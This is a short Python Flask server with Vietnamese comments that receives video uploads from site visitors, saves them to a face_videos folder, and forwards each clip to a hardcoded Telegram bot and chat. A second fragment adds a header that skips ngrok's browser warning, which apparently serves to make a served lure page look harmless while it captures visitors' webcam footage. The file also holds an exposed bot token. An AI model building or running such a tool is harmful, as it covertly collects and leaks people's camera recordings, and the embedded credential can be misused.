from flask import Flask, render_template, Response, send_from_directory, request
import cv2
import os
import time
from datetime import datetime
import requests

app = Flask(__name__)

# Thư mục lưu ảnh và video
IMAGE_DIR = "static/face_images"
VIDEO_DIR = "static/face_videos"
os.makedirs(IMAGE_DIR, exist_ok=True)
os.makedirs(VIDEO_DIR, exist_ok=True)

# Cấu hình Telegram Bot
BOT_TOKEN = '7521937060:AAGzbCRdr3owcCWNHb-FVy_zDZPYk2cgLVw'
CHAT_ID = '7103116819'

def send_telegram_video(video_path):
    try:
        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendVideo'
        with open(video_path, 'rb') as video_file:
            files = {'video': video_file}
            data = {'chat_id': CHAT_ID, 'caption': 'Video từ người dùng'}
            response = requests.post(url, files=files, data=data)
        print("[✓] Đã gửi video qua Telegram")
    except Exception as e:
        print(f"[!] Lỗi khi gửi Telegram: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload_video', methods=['POST'])
def upload_video():
    video_file = request.files['video']
    filename = f"client_{int(time.time())}.webm"
    path = os.path.join(VIDEO_DIR, filename)
    video_file.save(path)
    print(f"[+] Nhận video từ người dùng: {filename}")
    send_telegram_video(path)
    return "OK"

# Truy cập ảnh từ static/face_images/
@app.route('/images/<path:filename>')
def get_image(filename):
    return send_from_directory(IMAGE_DIR, filename)

# Truy cập video từ static/face_videos/
@app.route('/videos/<path:filename>')
def get_video(filename):
    return send_from_directory(VIDEO_DIR, filename)

if __name__ == '__main__':
    app.run(debug=True)
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.after_request
def add_header(response):
    response.headers['ngrok-skip-browser-warning'] = 'any-value'
    return response
